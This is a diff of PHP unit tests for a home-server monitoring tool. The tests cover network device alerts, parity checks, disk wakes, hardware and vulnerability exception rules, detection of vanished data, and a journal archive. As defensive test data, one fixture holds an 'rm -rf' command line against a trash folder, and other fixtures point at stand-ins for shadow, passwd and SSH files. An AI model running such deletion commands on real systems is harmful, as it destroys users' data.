+    $ev = fn (string $mac, string $network) => ['t' => 1000, 'type' => 'client', 'mac' => $mac, 'ip' => '192.168.9.5', 'name' => '', 'host' => '', 'network' => $network,
+                                               'head' => 'Nov 20 10:00:00', 'cef' => ['id' => '1', 'name' => 'x'], 'x' => []];
+    $device = function (string $mac, string $network, array $set) use ($ev): array {
+        watchnetSet($set);
+        $b = ['devices' => []];
+        $ns = ['senders' => []];
+        $book = [];
+        watchnetEvent($b, $ns, $book, '192.168.1.1', $ev($mac, $network), ['ips' => [], 'macs' => [], 'name' => 'tower'], 2000, false, false);
+        $hits = watchnetHits();
+        watchnetSet([]);
+        return [array_column($book, 'kind'), isset($b['devices'][$mac]), array_sum(array_column($hits, 'n'))];
+    };
+    same('6e devices: a new one — a line; a made-up address with the setting — learned, none; the guests\' network with your exception — learned, none, a hit; another network — a line',
+        [[['net_new_device'], true, 0], [[], true, 0], [[], true, 1], [['net_new_device'], true, 0], [['net_new_device'], true, 0]],
+        [$device('3c:22:fb:00:00:01', 'LAN', []), $device('3e:22:fb:00:00:01', 'LAN', ['random' => true]), $device('3c:22:fb:00:00:02', 'Gäste', ['nets' => ['r0000000n1' => 'Gäste']]),
+         $device('3c:22:fb:00:00:03', 'LAN', ['nets' => ['r0000000n1' => 'Gäste']]), $device('3c:22:fb:00:00:04', 'LAN', ['random' => true])]);
+
+    // the partner door's refusals: 3 in 60 s by default, 5 set
+    same('6e hand: an admin from a net, a VPN user (asked), a port, a sender (asked), a network',
+        [[['net_router_login'], ['admin' => 'benj', 'net' => '192.168.1.0/24'], false], [['net_vpn_login'], ['vpn' => 'phone'], true],
+         [['net_link_down'], ['sender' => '192.168.1.1', 'iface' => 'ether5'], false], [WATCH_RULE_ROUTER, ['sender' => '192.168.1.1'], true],
+         [['net_new_device'], ['network' => 'Gäste'], false]],
+        array_map(fn ($m) => [$m['kinds'], $m['on'], $m['wide']], [watchmanRuleHandMake('router', 'admin', '192.168.1.0/24', 'benj'), watchmanRuleHandMake('router', 'vpn', 'phone', ''),
+            watchmanRuleHandMake('router', 'link', 'ether5', '192.168.1.1'), watchmanRuleHandMake('router', 'sender', '192.168.1.1', ''), watchmanRuleHandMake('lan', 'network', 'Gäste', '')]));
+    same('6e hand: an admin missing, a public net wider than /24 — refused', ['watch_value_bad', 'watch_net_wide'],
+        [$err(fn () => watchmanRuleHandMake('router', 'admin', '192.168.1.0/24', '')), $err(fn () => watchmanRuleHandMake('router', 'admin', '203.0.0.0/16', 'benj'))]);
+}
+
+/**
+ * 1.96 step 6f — array and parity, what holds the array, who woke the disks: the settings (scheduled checks in his book,
+ * the page's own look, yellow from n wakes a day — off by default), the exceptions on their side kinds (a VM without the
+ * guest agent, a User Script that may run, an expected cause, a disk not counted) — listed still, never colouring.
+ */
+function testWatchmanRules6f(): void
+{
+    $err = fn (callable $f) => (function () use ($f) { try { $f(); return null; } catch (Problem $p) { return $p->key; } })();
+    same('6f settings: as up to 1.95 — scheduled checks in his book, the page looks by itself, no judgement of wakes', [true, true, 0],
+        [WATCH_SETTINGS['array']['scheduled']['def'], WATCH_SETTINGS['hold']['auto']['def'], WATCH_SETTINGS['wakes']['warn_at']['def']]);
+    $pc = fn (string $reason, array $p) => watchmanEntry('parity_check', 'parity_check:' . mt_rand(), 1, ['reason' => $reason] + $p);
+    $book = [$pc('schedule', ['end' => 5, 'exit' => 0, 'errors' => 0]), $pc('schedule', []), $pc('schedule', ['end' => 5, 'exit' => 0, 'errors' => 3]),
+             $pc('tuning', ['end' => 5, 'exit' => 0, 'errors' => 0]), $pc('manual', ['end' => 5, 'exit' => 0, 'errors' => 0]), $pc('unclean', ['end' => 5, 'exit' => 0, 'errors' => 0])];
+    same('6f parity: scheduled ones off — one ended clean (his schedule, Mover Tuning\'s) leaves; running, with errors, manual, unclean stay',
+        [[null, 0], [5, 3], [5, 0], [5, 0]],
+        array_map(fn ($e) => [$e['p']['end'] ?? null, $e['p']['errors'] ?? 0], watchmanParityScheduledOut($book)));
+    same('6f parity: … in order — the running scheduled, with errors, manual, unclean', ['schedule', 'schedule', 'manual', 'unclean'],
+        array_map(fn ($e) => $e['p']['reason'], watchmanParityScheduledOut($book)));
+
+    // the lights: what holds the array, the wakes
+    $now = 1800000000;
+    $rule = fn (string $cat, array $on) => ['id' => 'r' . substr(md5(json_encode($on)), 0, 10), 'cat' => $cat, 'kinds' => [$cat], 'on' => $on, 'at' => 1];
+    $light = function (array $s) use ($now): array {
+        $a = watchmanCats($s + ['time' => $now, 'hired' => true, 'on_watch' => $now - 86400 * 9])['areas'];
+        return [$a['hold']['level'], $a['wakes']['level'], $a['wakes']['why']];
+    };
+    $look = ['started' => 1, 'time' => $now - 10, 'count' => 1, 'holds' => [['kind' => 'userscript', 'name' => 'Nightly copy', 'files' => []]], 'times' => ['fits' => true]];
+    $wake = fn (int $t, string $disk, array $who) => ['id' => 'w' . $t, 'time' => $t, 'disks' => [$disk], 'how' => 'caught', 'who' => $who];
+    $plex = ['kind' => 'container', 'prog' => 'Plex', 'name' => 'plex', 'sure' => 'sure'];
+    $wakes = ['on' => true, 'hdds' => ['disk1', 'disk2'], 'wakes' => [$wake($now - 100, 'disk1', [$plex]), $wake($now - 200, 'disk1', [$plex]), $wake($now - 300, 'disk1', []),
+              $wake($now - 90000, 'disk1', [$plex]), $wake($now - 400, 'disk2', [$plex])]];
+    $set = fn (int $n) => ['settings' => ['wakes' => ['warn_at' => ['value' => $n, 'def' => 0, 'min' => 0, 'max' => 100, 'unit' => 'n0']]]];
+    same('6f hold: a User Script holding — yellow; that one may run — no colour (still in the list)',
+        ['warn', 'ok'], [$light(['hold' => ['look' => $look]])[0], $light(['hold' => ['look' => $look], 'rules' => [$rule('hold', ['script' => 'Nightly copy'])]])[0]]);
+    same('6f wakes: by default no judgement; 3 a day set — disk1 woke 3 times today: yellow; 4 set — not; plex expected — the one without a cause still counts: not; disk1 not counted — not',
+        ['ok', 'warn', 'ok', 'ok', 'ok', ['wakes_many']],
+        [$light(['wakes' => $wakes])[1], $light(['wakes' => $wakes] + $set(3))[1], $light(['wakes' => $wakes] + $set(4))[1],
+         $light(['wakes' => $wakes, 'rules' => [$rule('wakes', ['cause' => 'container:plex'])]] + $set(2))[1],
+         $light(['wakes' => $wakes, 'rules' => [$rule('wakes', ['disk' => 'disk1'])]] + $set(2))[1], $light(['wakes' => $wakes] + $set(3))[2]]);
+    same('6f wakes: plex expected — only the wake without a cause on disk1 counts', 1,
+        watchmanWakesMost($wakes, [$rule('wakes', ['cause' => 'container:plex'])], $now));
+
+    // the side kinds: only in their own area, never in the rules' pass
+    $shape = fn (string $cat, array $kinds, array $on) => watchmanRuleShaped(['id' => 'r00000000f1', 'cat' => $cat, 'kinds' => $kinds, 'on' => $on, 'at' => 1]) !== null;
+    same('6f shapes: hold\'s and wakes\' side kinds in their areas only', [true, true, true, false, false],
+        [$shape('hold', ['hold'], ['vm' => 'Windows 11']), $shape('wakes', ['wakes'], ['cause' => 'container:plex']), $shape('wakes', ['wakes'], ['disk' => 'disk1']),
+         $shape('login', ['hold'], ['vm' => 'x']), $shape('wakes', ['wakes'], ['cause' => 'nobody:plex'])]);
+    $b = [];
+    $st = [];
+    $bk = [watchmanEntry('flow_gone', 'flow_gone:disk:disk1', 1, ['disk' => 'disk1'])];
+    watchmanRulesApply($bk, [], $b, [], ['rules' => [watchmanRuleShaped($rule('wakes', ['disk' => 'disk1']))], 'off' => [], 'known' => []], [], $st, 2);
+    same('6f pass: «don\'t count disk1\'s wakes» never lets disk1\'s data flow through', true, watchmanOpen($bk[0]));
+    $made = fn (string $cat, string $type, string $v, string $second = '') => (fn ($m) => [$m['kinds'], $m['on']])(watchmanRuleHandMake($cat, $type, $v, $second));
+    same('6f hand: a VM, a User Script, a cause (its kind as the second field), a disk',
+        [[['hold'], ['vm' => 'Windows 11']], [['hold'], ['script' => 'Nightly copy']], [['wakes'], ['cause' => 'container:plex']], [['wakes'], ['cause' => 'mover:']],
+         [['wakes'], ['disk' => 'disk3']]],
+        [$made('hold', 'vm', 'Windows 11'), $made('hold', 'userscript', 'Nightly copy'), $made('wakes', 'cause', 'plex', 'container'), [['wakes'], ['cause' => 'mover:']], $made('wakes', 'disk', 'disk3')]);
+    same('6f hand: a kind of cause he doesn\'t know, a script with a slash — refused', ['watch_value_bad', 'watch_value_bad'],
+        [$err(fn () => watchmanRuleHandMake('wakes', 'cause', 'plex', 'nobody')), $err(fn () => watchmanRuleHandMake('hold', 'userscript', 'a/b', ''))]);
+}
+
+/**
+ * Settings and exceptions for 1.96's new abilities (task/nw-196, after the rule engine of step 4 and the settings of step 5):
+ * the defaults are what the capability branches hard-coded (the heat's own keys of set.hw with their bounds, the hardware's
+ * counters, a service's crashes, «maybe» of the vulnerabilities); each setting does what it says; every new kind's thing
+ * across days and boots (a sensor, a disk, a program, a port, a module, a device, the CPU, a CVE, a product), the offers on
+ * an entry (a sensor up to a few degrees over its hottest reading; the product asked clearly), what they cover and what not,
+ * the rules' pass; the exceptions by hand; the words in five languages.
+ */
+function testWatchmanRulesNew(): void
+{
+    // the defaults: what the branches hard-coded
+    $hot = [];
+    foreach (WATCH_HOT_SET as $k => [$def, $lo, $hi]) {
+        $hot[$k] = [$def, $lo, $hi];
+    }
+    $hw = (array) json_decode((string) json_encode(WATCH_SETTINGS['hw']), true);
+    same('settings: the heat\'s keys of set.hw — the same defaults and bounds as watchman-heat.php reads them', $hot,
+        array_map(fn ($d) => [$d['def'], $d['min'], $d['max']], array_intersect_key($hw, $hot)));
+    same('settings: the hardware\'s counters, the disks\' wear, a service\'s crashes, «maybe» — the constants',
+        [WATCH_HW_ECC_DAY, WATCH_HW_AER_HOUR, WATCH_HW_THROTTLE_HOUR, WATCH_HW_WEAR_USED[0], WATCH_SIGN_CRASHES, false, 'quiet', 'quiet', 'quiet'],
+        [$hw['ecc_day']['def'], $hw['aer_hour']['def'], $hw['throttle_min']['def'] * 60000, $hw['worn']['def'], WATCH_SETTINGS['host']['crashes']['def'],
+         WATCH_SETTINGS['vuln']['maybe']['def'], WATCH_SETTINGS['host']['oom']['def'], WATCH_SETTINGS['host']['flood']['def'], WATCH_SETTINGS['lan']['dns']['def']]);
+    same('settings: one his setup writes is what the heat and «maybe» read (set.hw, set.vuln)', [62, true],
+        [watchmanHotSettings((array) watchmanSettings(['set' => ['hw' => ['hot_nvme_c' => 62]]])['hw'])['hot_nvme_c'],
+         watchmanSettings(['set' => ['vuln' => ['maybe' => true]]])['vuln']['maybe']]);
+    $modes = watchmanKindModes(watchmanSettings(['set' => ['host' => ['oom' => 'tell', 'flood' => 'none'], 'lan' => ['dns' => 'tell']]]));
+    ksort($modes);
+    same('settings: a choice sets its kinds (out of memory told, floods not at all, DNS told)', ['host_flood' => 'none', 'host_oom' => 'tell', 'net_dns' => 'tell'], $modes);
+
+    // each setting does what it says: memory errors told from 3 a day; a service's crashes from 2 in an hour
+    $now = 1790000000;
+    $book = [];
+    $look = ['mce' => null, 'edac' => ['mc0' => ['name' => 'x', 'ce' => 0, 'ue' => 0, 'dimms' => ['dimm0' => ['label' => 'A1', 'ce' => 0, 'ue' => 0]]]],
+             'aer' => null, 'throttle' => null, 'taint' => null];
+    [, $ram] = watchmanHwCompare(null, 'look', $look, 'b', $now, $book, ['ecc_day' => 3]);
+    $look['edac']['mc0']['ce'] = $look['edac']['mc0']['dimms']['dimm0']['ce'] = 3;
+    watchmanHwCompare($ram, 'ram', $look, 'b', $now + 300, $book, ['ecc_day' => 3]);
+    same('setting hw.ecc_day 3: three corrected errors on a module — told', [1, true], [count($book), watchmanImportant($book[0] ?? [])]);
+    $book = [];
+    $st = [];
+    $sign = fn (int $t) => ['kind' => 'host_crash', 'thing' => 'smbd', 'line' => 'kernel: smbd[1]: segfault', 'time' => $t, 'host' => 'tower', 'sign' => 'segfault'];
+    watchmanSignsCompare($book, $st, [$sign($now), $sign($now + 60)], 'tower', [], $now + 120, 2);
+    same('setting host.crashes 2: two crashes in an hour — a line (three by default)', [['host_crash'], 2], [array_column($book, 'kind'), $book[0]['count'] ?? null]);
+
+    // the things across days and boots, and what is offered on an entry
+    $e = fn (string $kind, string $key, array $p) => ['noted' => null] + watchmanEntry($kind, $key, $now, $p);
+    $hotE = $e('hw_hot', 'hw_hot:nvme:cache', ['sensor' => 'nvme:cache', 'kind' => 'nvme', 'name' => 'cache', 'c' => 71, 'peak' => 72, 'limit' => 70, 'minutes' => 130]);
+    $cases = [
+        'hw_hot'     => [$hotE, ['sensor:nvme:cache']],
+        'hw_io'      => [$e('hw_io', 'hw_io:sdc:2026-11-22', ['dev' => 'sdc', 'disk' => 'disk1']), ['disk:disk1']],
+        'hw_wear'    => [$e('hw_wear', 'hw_wear:WDC_X:a5', ['what' => 'a5', 'name' => 'disk1', 'id' => 'WDC_X']), ['disk:WDC_X']],
+        'host_oom'   => [$e('host_oom', 'host_oom:emby:2026-11-22', ['prog' => 'emby']), ['prog:emby']],
+        'host_crash' => [$e('host_crash', 'host_crash:smbd:2026-11-22', ['prog' => 'smbd']), ['prog:smbd']],
+        'host_flood' => [$e('host_flood', 'host_flood:conntrack:2026-11-22', ['port' => null]), ['port:conntrack']],
+        'hw_ecc'     => [$e('hw_ecc', 'hw_ecc:aaaaaaaa:mc0/dimm0', ['where' => 'mc0/dimm0', 'label' => 'A1']), ['module:mc0/dimm0']],
+        'hw_aer'     => [$e('hw_aer', 'hw_aer:aaaaaaaa:0000:01:00.0', ['dev' => '0000:01:00.0']), ['dev:0000:01:00.0']],
+        'hw_mce'     => [$e('hw_mce', 'hw_mce:aaaaaaaa', ['mce' => 1]), ['cpu']],
+        'vuln_known' => [$e('vuln_known', 'vuln_known:CVE-2024-4577:php:web', ['cve' => 'CVE-2024-4577', 'product' => 'php', 'where' => 'web']), ['cve:CVE-2024-4577', 'product:php']],
+        'flash_boot' => [$e('flash_boot', 'flash_boot:plg:x', ['what' => 'plg', 'file' => 'x.plg']), []],
+    ];
+    same('things: each new kind\'s, across days and boots (none where the key is the thing already)', array_map(fn ($c) => $c[1], $cases),
+        array_map(fn ($c) => watchmanRuleThings($c[0]), $cases));
+    $offers = fn (array $x) => array_map(fn ($o) => [$o['type'], $o['on'], $o['ask']], watchmanRuleOffers($x, [$x]));
+    same('offers: a sensor — exactly this one, up to 75 °C (its hottest 72), always', [
+        ['key', ['key' => 'hw_hot:nvme:cache'], false], ['max_c', ['thing' => 'sensor:nvme:cache', 'max_c' => 75], false], ['thing', ['thing' => 'sensor:nvme:cache'], false]],
+        $offers($hotE));
+    same('offers: a vulnerability — the CVE, the whole product: asked clearly (security); a «maybe»\'s product too', [true, true, true],
+        [$offers($cases['vuln_known'][0])[1][2] ?? null, $offers($cases['vuln_known'][0])[2][2] ?? null,
+         $offers($e('vuln_maybe', 'vuln_maybe:CVE-1:php:web', ['cve' => 'CVE-2024-1', 'product' => 'php', 'where' => 'web']))[2][2] ?? null]);
+    same('offers: memory errors and machine checks asked clearly; a crash plainly', [true, true, false],
+        [$offers($cases['hw_ecc'][0])[1][2] ?? null, $offers($cases['hw_mce'][0])[1][2] ?? null, $offers($cases['host_crash'][0])[1][2] ?? null]);
+    // what a rule covers: the thing on another day, not another thing; a sensor within its degrees, not over them
+    $rule = fn (string $kind, array $on) => watchmanRuleShaped(['id' => 'r0123456789', 'cat' => watchmanCatOf($kind), 'kinds' => [$kind], 'on' => $on, 'at' => $now]);
+    $crash = $rule('host_crash', ['thing' => 'prog:smbd']);
+    $warm = $rule('hw_hot', ['thing' => 'sensor:nvme:cache', 'max_c' => 75]);
+    $hotter = ['p' => ['peak' => 78] + $hotE['p']] + $hotE;
+    same('covers: smbd\'s crashes the next day — yes; nginx\'s — no; the sensor at 72 °C — yes, at 78 °C — no', [true, false, true, false],
+        [watchmanRuleCovers($crash, $e('host_crash', 'host_crash:smbd:2026-11-23', ['prog' => 'smbd'])), watchmanRuleCovers($crash, $e('host_crash', 'host_crash:nginx:2026-11-23', ['prog' => 'nginx'])),
+         watchmanRuleCovers($warm, $hotE), watchmanRuleCovers($warm, $hotter)]);
+    same('shapes: a limit only on a sensor and within 30–120 °C; a thing in its shape', [null, null, null],
+        [$rule('host_crash', ['thing' => 'prog:smbd', 'max_c' => 75]), $rule('hw_hot', ['thing' => 'sensor:nvme:cache', 'max_c' => 200]), $rule('hw_io', ['thing' => "disk:\x01"])]);
+    // the rules' pass: a new crash line of smbd noted by the rule, never told
+    $book = [$e('host_crash', 'host_crash:smbd:2026-11-23', ['prog' => 'smbd'])];
+    $b = [];
+    $st = [];
+    $res = watchmanRulesApply($book, [], $b, [], ['rules' => [$crash], 'off' => [], 'known' => [], 'set' => []], [], $st, $now);
+    same('pass: a new crash line of smbd — noted by the rule, never told', [1, 'rule', false], [$res['noted'], $book[0]['by'] ?? null, watchmanOpen($book[0])]);
+
+    // by hand
+    $err = function (callable $f): ?string {
+        try {
+            $f();
+            return null;
+        } catch (Problem $p) {
+            return $p->key;
+        }
+    };
+    same('by hand: a service\'s crashes, a program out of memory, a CVE (written as people do), a whole product (wide)', [
+        [['host_crash'], ['thing' => 'prog:smbd'], false], [['host_oom'], ['thing' => 'prog:emby'], false],
+        [['vuln_known', 'vuln_maybe'], ['thing' => 'cve:CVE-2024-4577'], false], [['vuln_known', 'vuln_maybe'], ['thing' => 'product:php'], true]],
+        array_map(fn ($m) => [$m['kinds'], $m['on'], $m['wide']], [watchmanRuleHandMake('host', 'crash', 'smbd', ''), watchmanRuleHandMake('host', 'oom', 'emby', ''),
+            watchmanRuleHandMake('vuln', 'cve', 'cve-2024-4577', ''), watchmanRuleHandMake('vuln', 'product', 'PHP', '')]));
+    same('by hand: refused — not a CVE, a product not on the list, a program with a slash', ['watch_value_bad', 'watch_value_bad', 'watch_value_bad'],
+        [$err(fn () => watchmanRuleHandMake('vuln', 'cve', 'CVE-12', '')), $err(fn () => watchmanRuleHandMake('vuln', 'product', 'nonsense', '')),
+         $err(fn () => watchmanRuleHandMake('host', 'crash', 'a/b', ''))]);
+
+    // the words
+    $keys = ['setup.unit.c', 'rule.offer.max_c', 'rule.offer.thing.conntrack', 'rule.offer.thing.cve', 'rule.offer.thing.product', 'setup.add_wide.vuln'];
+    foreach (['hw_hot', 'hw_io', 'hw_wear', 'host_oom', 'host_crash', 'host_flood', 'hw_ecc', 'hw_aer', 'hw_mce', 'hw_throttle'] as $k) {
+        $keys[] = "rule.offer.thing.$k";
+    }
+    foreach (['crash', 'oom', 'cve', 'product'] as $k) {
+        $keys[] = "setup.add_type.$k";
+        $keys[] = "setup.add_value.$k";
+    }
+    foreach (['host' => ['oom', 'flood'], 'lan' => ['dns']] as $cat => $ks) {
+        foreach ($ks as $k) {
+            foreach (WATCH_SETTINGS[$cat][$k]['of'] as $v) {
+                $keys[] = "setting.$cat.$k.$v";
+            }
+        }
+    }
+    $missing = [];
+    foreach (['en', 'de', 'it', 'fr', 'es'] as $code) {
+        $lang = langFile(OFFICE_WEB . "/desks/watchman/lang/$code.json");
+        foreach ($keys as $k) {
+            if (!is_string($lang[$k] ?? null)) {
+                $missing[] = "$code $k";
+            }
+        }
+    }
+    same('words: the new offers, the exceptions by hand, the choices, the unit — in five languages', [], $missing);
+    $js = (string) file_get_contents(OFFICE_WEB . '/desks/watchman/desk.js');
+    check('page: the offers «thing» and «max_c» are shown, the hand types have their examples', str_contains($js, "'network', 'thing', 'max_c'];")
+        && str_contains($js, "crash: 'smbd', oom: 'emby', cve: 'CVE-2024-4577'"));
+}
+
+/**
+ * 1.96 step 6g — the two broad built-in excuses narrowed (concept 9, points 1 and 2): the engine's lock excuses what
+ * vanishes only in the office's own shares (a restore: all of it, as before); rsync --remove-source-files and the
+ * storeroom's purge only in the shares their paths name — like the movers.
+ */
+function testWatchmanRules6g(): void
+{
+    $gb = 1024 ** 3;
+    $t0 = strtotime('2026-10-06 14:02:00');
+    $ds = fn (int $r, int $x = 0) => ['w' => 0, 'u' => $r, 's' => 1000, 'r' => $r, 'b' => 0, 'x' => $x];
+    $look = fn (array $o) => $o + ['conns' => [], 'smb' => ['on' => true, 'sessions' => []], 'containers' => null, 'nfs' => false, 'holder' => null, 'kopia' => 'kopia',
+                                   'zfs' => null, 'office_shares' => ['UnraidSecretaryOffice'], 'disks' => null, 'moving' => []];
+    $zfs = fn (array $sets) => ['datasets' => ['tank' => $ds(1)] + $sets, 'pools' => ['tank'], 'asleep' => []];
+    $before = ['tank/Fotos' => $ds(1000 * $gb, 100), 'tank/Media' => $ds(1000 * $gb, 100), 'tank/UnraidSecretaryOffice' => $ds(1000 * $gb, 100)];
+    // $after: the datasets after the round; $o: the round's look — what is told (keys)
+    $round = function (array $after, array $o) use ($look, $zfs, $before, $t0): array {
+        $bf = null;
+        $book = [];
+        [, $flow, $cnt] = watchmanFlowCompare($bf, [], null, $look(['zfs' => $zfs($before)]), $book, $t0);
+        watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs($after + $before)] + $o), $book, $t0 + 300);
+        $keys = array_column(array_filter($book, 'watchmanOpen'), 'key');
+        sort($keys);
+        return $keys;
+    };
+    $gone = fn (string $share) => ["tank/$share" => $ds(700 * $gb, 100)];
+    same('6g backup running: 300 GB gone from Fotos — told (up to 1.95 expected); from the office\'s own share — its own, silent',
+        [['flow_gone:share:Fotos'], []], [$round($gone('Fotos'), ['holder' => 'backup']), $round($gone('UnraidSecretaryOffice'), ['holder' => 'backup'])]);
+    same('6g a restore running: what vanishes anywhere is still its own (it puts aside what it replaces)', [], $round($gone('Fotos'), ['holder' => 'restore']));
+    same('6g rsync --remove-source-files from Media: 300 GB gone from Media — expected; from Fotos meanwhile — told',
+        [[], ['flow_gone:share:Fotos']], [$round($gone('Media'), ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]]),
+         $round($gone('Fotos'), ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]])]);
+    same('6g rsync whose paths name no share (another mount): nothing excused', ['flow_gone:share:Media'],
+        $round($gone('Media'), ['moving' => ['rsync'], 'move_shares' => ['rsync' => []]]));
+    same('6g files deleted: 30 000 in Fotos while rsync works in Media — told; in Media — expected',
+        [['flow_gone:files:share:Fotos'], []],
+        [$round(['tank/Fotos' => $ds(1000 * $gb, 30100)], ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]]),
+         $round(['tank/Media' => $ds(1000 * $gb, 30100)], ['moving' => ['rsync'], 'move_shares' => ['rsync' => ['Media']]])]);
+
+    // which shares: from the processes' own arguments
+    $tmp = hardeningTmp('watch-6g');
+    foreach (['101' => ['rsync', '-a', '--remove-source-files', '/mnt/user/Media/Filme/', '/mnt/disk3/Media/Filme/'],
+              '102' => ['rsync', '-a', '--remove-source-files', '/mnt/remotes/nas/x/', '/tmp/y/'],
+              '103' => ['rm', '-rf', '--', '/mnt/hazel/Serien/_UnraidSecretaryOffice-trash/20261006-1010.purging'],
+              '104' => ['rsync', '-a', '/mnt/user/Fotos/', '/mnt/user/Backup/']] as $pid => $argv) {
+        @mkdir("$tmp/proc/$pid", 0700, true);
+        file_put_contents("$tmp/proc/$pid/cmdline", implode("\0", $argv) . "\0");
+    }
+    same('6g shares: rsync --remove-source-files — the shares its paths name (never another mount); the purge — its share and its disk; a copy (no removing) — none',
+        [['rsync' => ['Media'], 'storeroom' => ['Serien']], ['hazel']], [watchmanFlowMoverShares("$tmp/proc"), watchmanFlowStoreDisks("$tmp/proc")]);
+    hardeningRm($tmp);
+}
+
+/**
+ * 1.96 step 7 — his history: lines he (or an exception) noted leave the book after a quiet week, or earlier while the book is
+ * over its bound, into data/watchman/journal/YYYY-MM.jsonl; a person's answers and open lines stay; a full month is counted;
+ * 13 months kept; never through a link; the page reads a month a hundred lines at a time.
+ */
+function testWatchmanJournal(): void
+{
+    $now = strtotime('2026-11-20 10:00:00');
+    $e = function (string $by, int $quiet, array $more = []) use ($now): array {
+        $x = watchmanEntry('at_userscript', 'at_userscript:' . mt_rand(), $now - $quiet - 3600, ['name' => 'x', '_h' => 'internal']);
+        $x['last'] = $now - $quiet;
+        $x['noted'] = $by === '' ? null : $now - $quiet;
+        $x['by'] = $by === '' ? null : $by;
+        return $more + $x;
+    };
+    same('journal: his own lines (auto, office, rule, a lasting answer) — never open ones, a person\'s («I know», the Team Lead), a serious incident, one without who',
+        [true, true, true, true, false, false, false, false, false],
+        array_map('watchmanJournalOwn', [$e('auto', 0), $e('office', 0), $e('rule', 0), $e('known', 0), $e('', 0), $e('page', 0), $e('teamlead', 0),
+            $e('page', 0, ['serious' => 1]), $e('auto', 0, ['by' => null])]));
+    $tmp = hardeningTmp('watch-journal');
+    $book = [$e('auto', 8 * 86400), $e('auto', 86400), $e('page', 60 * 86400), $e('', 9 * 86400)];
+    $st = [];
+    $left = watchmanJournalMove($tmp, $book, $st, $now);
+    $file = "$tmp/journal/" . date('Y-m', $now - 8 * 86400) . '.jsonl';
+    same('journal: a quiet week — his own line into its month\'s file; a recent one, a person\'s answer, an open line stay; counted',
+        [3, [$book[1]['id'], $book[2]['id'], $book[3]['id']], 1, 1, '700'],
+        [count($left), array_column($left, 'id'), count(file($file)), $st['journal']['moved'] ?? 0, substr(sprintf('%o', fileperms("$tmp/journal")), -3)]);
+    // the newest parity check stays in the book («Array and parity» reads its errors there), the older ones go
+    $pc = function (int $quiet) use ($now) {
+        $x = watchmanEntry('parity_check', 'parity_check:' . ($now - $quiet), $now - $quiet, ['reason' => 'schedule', 'end' => $now - $quiet + 600, 'errors' => 3]);
+        return ['noted' => $now - $quiet, 'by' => 'parity'] + $x;
+    };
+    $stp = [];
+    $pleft = watchmanJournalMove($tmp, [$pc(40 * 86400), $pc(30 * 86400)], $stp, $now);
+    same('journal: of the parity checks, the newest stays in the book (its errors colour the area), the older goes', [[$now - 30 * 86400]], [array_column($pleft, 'time')]);
+    // over the bound: his own lines go first, the oldest of them, until the book fits
+    $big = [];
+    for ($i = 0; $i < WATCH_BOOK_MAX - 5; $i++) {
+        $big[] = $e('page', 3600);
+    }
+    for ($i = 0; $i < 15; $i++) {
+        $big[] = $e('auto', 3600 + $i * 60);
+    }
+    $st2 = [];
+    $left = watchmanJournalMove($tmp, $big, $st2, $now);
+    same('journal: the book over its bound — the oldest ten of his own lines go, a person\'s answers all stay',
+        [WATCH_BOOK_MAX, 5, WATCH_BOOK_MAX - 5], [count($left), count(array_filter($left, fn ($x) => $x['by'] === 'auto')), count(array_filter($left, fn ($x) => $x['by'] === 'page'))]);
+    // a full month: counted, the line out of the book all the same; months beyond 13 go
+    $full = "$tmp/journal/" . date('Y-m', $now) . '.jsonl';
+    $h = fopen($full, 'a');
+    ftruncate($h, WATCH_JOURNAL_MAX - 10);
+    fclose($h);
+    touch("$tmp/journal/2020-01.jsonl");
+    $st3 = ['journal' => ['cut' => ['2020-01' => 4]]];
+    $left = watchmanJournalMove($tmp, [$e('auto', 8 * 86400 - 3600 * 24 * 0), $e('auto', 7 * 86400 + 60)], $st3, $now);
+    same('journal: a full month — counted (said on the page), the lines out of the book anyway; a month beyond 13 goes with its count',
+        [0, false, true], [count($left), file_exists("$tmp/journal/2020-01.jsonl"), (int) array_sum($st3['journal']['cut'] ?? []) >= 1]);
+    // reading: months newest first, a page newest first, no internal value, other shapes left out
+    $mo = date('Y-m', $now - 30 * 86400);
+    $lines = '';
+    for ($i = 0; $i < 130; $i++) {
+        $x = $e('auto', 30 * 86400 - $i);
+        $lines .= json_encode($x) . "\n";
+    }
+    file_put_contents("$tmp/journal/$mo.jsonl", $lines . "not json\n" . json_encode(['id' => 'x']) . "\n", FILE_APPEND);
+    $r = watchmanJournalRead($tmp, $mo, 0, $st3);
+    $r2 = watchmanJournalRead($tmp, $mo, 100, $st3);
+    same('journal: read — the months newest first; a hundred of a month, newest first, «more»; the rest from 100; never an internal value, never another shape',
+        [true, $mo, 100, true, 30 * 86400 - 129, false, false, true],
+        [$r['months'][0]['month'] >= $r['months'][count($r['months']) - 1]['month'], $r['month'], count($r['entries']), $r['more'], $now - $r['entries'][0]['last'],
+         $r2['more'], str_contains(json_encode($r), '"_h"'), count($r2['entries']) >= 30]);
+    same('journal: the action — a month not in its shape refused', 'bad_request',
+        (function () use ($tmp) { try { watchmanJournalAction('2026/11', 0, $tmp); return null; } catch (Problem $p) { return $p->key; } })());
+    hardeningRm($tmp);
+    // never through a link: the folder a link — nothing written, the lines stay in the book
+    $tmp = hardeningTmp('watch-journal-link');
+    @mkdir("$tmp/elsewhere", 0700);
+    symlink("$tmp/elsewhere", "$tmp/journal");
+    $st4 = [];
+    same('journal: its folder a link — nothing written there, the line stays', [1, []], [count(watchmanJournalMove($tmp, [$e('auto', 8 * 86400)], $st4, $now)), array_values(array_diff(scandir("$tmp/elsewhere"), ['.', '..']))]);
+    hardeningRm($tmp);
+}
+
+/**
+ * Concept 12.1 (not tested before): a whole round and a night shift on a data folder in 1.95's shape — no rules.json, a
+ * baseline without the 1.96 parts (start files, the router's address), a state without theirs, no hardware file. Every
+ * new part learns its first look quietly: nothing added, nothing told, the night's handover brings nothing new.
+ */
+function testWatchmanFrom195(): void
+{
+    $tmp = hardeningTmp('watch-195');
+    $src = "$tmp/src";
+    $data = "$tmp/data";
+    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
+        @mkdir("$src/$d", 0700, true);
+    }
+    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
+              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
+              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
+    $t0 = strtotime('2026-11-20 10:00:00');
